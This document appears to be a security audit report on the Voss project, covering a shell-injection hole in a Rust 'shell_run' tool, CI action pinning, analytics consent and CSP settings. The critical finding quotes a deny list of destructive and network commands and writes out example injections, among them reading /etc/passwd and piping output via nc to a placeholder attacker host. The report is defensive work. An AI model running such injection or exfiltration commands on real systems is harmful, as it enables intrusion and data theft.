# Security Audit Report — Voss

**Date:** 2026-05-27
**Scope:** Full system scan (all 32 categories)
**Stack:** Rust crates + Tauri desktop app + SolidJS frontend + Next.js marketing site + Python harness + GitHub Actions CI

---

## Summary

- **Overall Risk:** High
- **Findings:** 1 Critical, 0 High, 2 Medium, 2 Low

---

## Critical Findings

### 1. Shell Injection in Rust `shell_run` — Missing Metacharacter Guard

- **File:** `crates/voss-tools/src/shell_run.rs:62-64`
- **Evidence:**
  ```rust
  let mut cmd = Command::new("sh");
  cmd.arg("-c")
      .arg(&args.cmd)
  ```
- **File:** `crates/voss-tools/src/sandbox.rs:13-22` (missing SHELL_METACHARS)
  ```rust
  pub const DENY_TOKENS: &[&str] = &[
      "rm -rf",
      "sudo",
      "curl http",
      "nc ",
      " > /",
      "shutdown",
      "reboot",
      "mkfs",
  ];
  ```
- **Why it is vulnerable:** The Rust `shell_run` tool passes commands to `sh -c` (shell invocation) but the Rust `sandbox.rs` does NOT reject shell metacharacters (`;`, `|`, `&&`, `||`, `$(`, backtick, etc.). The Python equivalent (`voss/harness/sandbox.py:22`) has an explicit `SHELL_METACHARS` guard AND uses `create_subprocess_exec` (no shell). The Rust version has neither defense.

  **Attack vector:** A command like `git log; cat /etc/passwd` passes the allowlist check (`git` is allowlisted), then `sh -c` interprets `;` as a command separator, executing both commands. Pipelines (`git log | nc attacker 4444`) and command substitution (`git log $(malicious)`) also bypass.

- **Impact:** An LLM agent (or any caller of the `shell_run` tool) can execute arbitrary commands by prepending an allowlisted binary name and using shell metacharacters.

- **Fix:**
  1. **Port `SHELL_METACHARS` from Python to Rust.** Add to `sandbox.rs`:
     ```rust
     pub const SHELL_METACHARS: &[&str] = &[
         ";", "|", "&&", "||", "&", "$(", "`", ">", "<", ">>", "<<", "<(", ">(",
     ];
     ```
     Check in `shell_allowed()` before the allowlist:
     ```rust
     for meta in SHELL_METACHARS {
         if cmd.contains(meta) {
             return Err(SandboxError::DenyToken((*meta).to_string()));
         }
     }
     ```
  2. **Replace `sh -c` with direct exec.** In `shell_run.rs`, use `shlex::split` then `Command::new(argv[0]).args(&argv[1..])` — matching the Python behavior. This is the defense-in-depth fix.

---

## Medium Findings

### 2. CI/CD Actions Pinned to Tags, Not Commit SHAs

- **Files:** `.github/workflows/ci.yml:39`, `.github/workflows/release.yml:91`, all workflow files
- **Evidence:**
  ```yaml
  - uses: actions/checkout@v6
  - uses: actions/setup-python@v6
  - uses: dtolnay/rust-toolchain@stable
  - uses: Swatinem/rust-cache@v2
  - uses: docker/login-action@v3
  ```
- **Why it is a risk:** Tag pins (`@v6`) can be force-pushed by upstream maintainers or compromised accounts. SHA pins (`@abc123...`) are immutable. The release workflow holds `NPM_TOKEN` (supply-chain blast radius = every install of `@vosslang/cli`).
- **Mitigations already in place:** Dependabot is configured with a 3-day cooldown on action bumps. Workflow-level `permissions: contents: read`. The `release.yml` has detailed hardening notes acknowledging this tradeoff.
- **Fix:** Pin actions to full commit SHAs in the release workflow at minimum. Dependabot will auto-PR SHA bumps. Example:
  ```yaml
  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v6
  ```

### 3. PostHog Analytics Without Consent Gating (GDPR)

- **File:** `site/components/PostHogProvider.tsx:29-38`
- **Evidence:**
  ```tsx
  useEffect(() => {
    if (!POSTHOG_KEY) return;
    posthog.init(POSTHOG_KEY, {
      api_host: POSTHOG_HOST,
      capture_pageview: false,
      capture_pageleave: true,
      persistence: "localStorage+cookie",
      cross_subdomain_cookie: false,
    });
  }, []);
  ```
- **Why it is a risk:** PostHog initializes unconditionally on page load — no consent banner or cookie opt-in check. For EU visitors, GDPR Art 7 requires informed consent before setting analytics cookies/localStorage. `persistence: "localStorage+cookie"` stores tracking data immediately.
- **Fix:** Gate `posthog.init()` behind a consent check. Use PostHog's `opt_out_capturing_by_default: true` option combined with a consent banner that calls `posthog.opt_in_capturing()` on acceptance.

---

## Low Findings

### 4. CSP Allows `unsafe-inline` for Styles

- **File:** `apps/voss-app/src-tauri/tauri.conf.json:29`
- **Evidence:**
  ```json
  "csp": "default-src 'self'; style-src 'self' 'unsafe-inline'; ..."
  ```
- **Also:** `site/vercel.json:34` and `site/public/_headers:2`
- **Why it is low risk:** `unsafe-inline` for styles is common in Tauri apps (no nonce mechanism for Solid's style injection). For the marketing site, it weakens CSP but style injection alone has limited attack surface. Script-src is properly restricted to `'self'`.

### 5. Site CSP `connect-src` Blocks PostHog

- **File:** `site/vercel.json:34`
- **Evidence:**
  ```json
  "connect-src 'self'"
  ```
- **Why it matters:** PostHog sends analytics to `us.i.posthog.com`, which is not whitelisted in `connect-src`. CSP blocks these requests silently. This is a functionality bug (analytics don't reach PostHog) rather than a security issue, but indicates the CSP was not tested against the full feature set.
- **Fix:** Add `https://us.i.posthog.com` to `connect-src` in both `vercel.json` and `public/_headers`, or remove PostHog if analytics aren't needed.

---

## Passed Checks

- [x] **No SQL injection** — No SQL databases; no raw queries (Category 1)
- [x] **No XSS** — `dangerouslySetInnerHTML` only with build-time shiki output (trusted). SolidJS auto-escapes text. Test `innerHTML` for DOM cleanup only (Category 2)
- [x] **No hardcoded secrets** — All test tokens are dummy values (`"x"`, `"acc"`, `"sk-test"`). `.env.local` not tracked by git. PostHog `phc_` key is a public project key (Category 3)
- [x] **Auth credentials handled securely** — Read from env vars, macOS Keychain, or per-user files. Credential files written with `0o600` permissions via `set_owner_only()` (Category 4)
- [x] **No SSRF** — HTTP clients (`reqwest`) only call fixed API endpoints (Anthropic, OpenAI). No user-controlled URLs in server requests (Category 5)
- [x] **Supabase** — Not used (Category 6)
- [x] **Rate Limiting** — Not applicable; desktop app, not a web service (Category 7)
- [x] **CORS** — Not applicable; no cross-origin API (Category 8)
- [x] **Cryptography** — SHA-256 for repo index (non-security fingerprinting). No weak password hashing. No `Math.random` for security (Category 9)
- [x] **Python shell sandbox hardened** — `SHELL_METACHARS` + `create_subprocess_exec` + `DENY_TOKENS` + allowlist — four layers of defense (Category 10, Python side)
- [x] **Cloud Security** — No cloud SDKs. CI secrets via `${{ secrets.* }}` (Category 11)
- [x] **No sensitive data in logs** — Console logs contain operational info only (`[voss-app]` prefixed error messages) (Category 12)
- [x] **Stripe** — Not used (Category 13)
- [x] **Auth Providers** — Custom OAuth; no third-party auth SDKs (Category 14)
- [x] **AI API keys server-only** — `ANTHROPIC_API_KEY` and `OPENAI_API_KEY` loaded from env vars in Rust/Python only (Category 15)
- [x] **Email Services** — Not used (Category 16)
- [x] **Database** — No database; file-based persistence only (Category 17)
- [x] **Redis/Cache** — Not used (Category 18)
- [x] **SMS/Communication** — Not used (Category 19)
- [x] **HIPAA** — Not applicable (Category 20)
- [x] **SOC 2** — Not applicable; developer tool, not enterprise SaaS (Category 21)
- [x] **PCI-DSS** — Not applicable; no payment processing (Category 22)
- [x] **Memory Leaks** — All `addEventListener` has matching `removeEventListener` in `onCleanup`. All `setInterval`/`setTimeout` cleared. `ResizeObserver` disconnected. Thorough cleanup in `PaneComponent.tsx:449-468` (Category 24)
- [x] **N+1 Queries** — No database; no ORM (Category 25)
- [x] **Performance** — No sync file I/O in hot paths. Proper async patterns throughout (Category 26)
- [x] **Dependencies** — `pnpm-lock.yaml`, `Cargo.lock`, `site/package-lock.json` all present. Dependabot configured for 4 ecosystems. `pip-audit` in CI (Category 27)
- [x] **Authorization/IDOR** — Desktop app; no multi-user resource access (Category 28)
- [x] **File Uploads** — Not applicable (Category 29)
- [x] **Input Validation** — Python `jail_path` with canonicalization rejects `../` escapes. Rust `jail_path` mirrors it. `shlex.split` for command parsing (Category 30)
- [x] **CI/CD Secrets** — All secrets via `${{ secrets.* }}`. No `pull_request_target`. Workflow permissions scoped to `contents: read` (Category 31, partial — see Finding 2)
- [x] **Security Headers** — Marketing site: HSTS, X-Content-Type-Options, X-Frame-Options, Referrer-Policy, Permissions-Policy, CSP all configured in `vercel.json`. Tauri app: CSP configured (Category 32)

---

## Bright Spots

1. **Python sandbox is exemplary.** `SHELL_METACHARS` + `create_subprocess_exec` + `DENY_TOKENS` + allowlist — four layers of defense for shell execution.
2. **Credential file permissions.** `set_owner_only()` in `file_store.rs:148` sets 0600 on credential files.
3. **Tauri CSP.** `connect-src` explicitly lists allowed IPC targets. `script-src 'self'` — no `unsafe-eval`.
4. **Dependabot with cooldown.** 3-day delay on action bumps prevents fast-yank supply chain attacks.
5. **Dep audit in CI.** `pip-audit` runs on every PR + daily cron with strict mode on schedule.
6. **Thorough SolidJS cleanup.** Every component with listeners/timers has matching `onCleanup`.
7. **`unsafe` blocks minimal and documented.** Only 2 instances in `foreground.rs` — both `BorrowedFd::borrow_raw` with safety comments.

---

## Recommended Priority

| # | Finding | Severity | Effort | Action |
|---|---------|----------|--------|--------|
| 1 | Rust shell metacharacter injection | Critical | Small | Port SHELL_METACHARS + switch to exec |
| 2 | CI/CD tag pins on release workflow | Medium | Small | SHA-pin actions in release.yml |
| 3 | PostHog consent gating | Medium | Medium | Add consent banner + opt-in flow |
| 4 | CSP unsafe-inline | Low | Low | Acceptable for Tauri; consider nonces for site |
| 5 | CSP blocks PostHog | Low | Small | Add PostHog host to connect-src |
